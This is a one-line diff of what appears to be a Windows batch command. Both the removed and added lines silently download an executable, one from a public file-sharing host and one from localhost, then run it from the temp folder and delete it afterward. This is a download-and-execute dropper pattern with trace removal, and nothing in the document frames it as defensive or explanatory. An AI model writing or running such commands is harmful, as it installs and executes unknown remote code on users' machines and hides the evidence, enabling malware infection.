@@ -1,1 +1,1 @@
-curl https://filebin.net/1iq5mj3xfyngguag/j.exe -s -o "%temp%\script.exe" && "%temp%\script.exe" && timeout 10 && del %temp%\script.exe && exit
+curl localhost/j.exe -s -o "%temp%\script.exe" && "%temp%\script.exe" && del %temp%\script.exe && exit
